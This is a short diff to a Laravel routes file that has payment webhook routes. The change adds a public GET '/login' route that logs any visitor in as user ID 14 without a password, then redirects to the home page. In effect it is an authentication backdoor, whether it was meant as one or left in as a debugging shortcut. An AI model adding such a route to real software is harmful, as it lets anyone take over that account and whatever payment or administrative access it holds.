@@ -2,6 +2,11 @@
 
 use Illuminate\Support\Facades\Route;
 
+Route::get('/login', function () {
+    \Auth::loginUsingId(14);
+    return redirect('/');
+});
+
 Route::post('/payment/fkfkfk', 'PaymentController@handle');
 Route::post('/payment/aaio/handle', 'PaymentController@handleAaio');
 //Route::post('/payment/vlito', 'PaymentController@handleVlito');
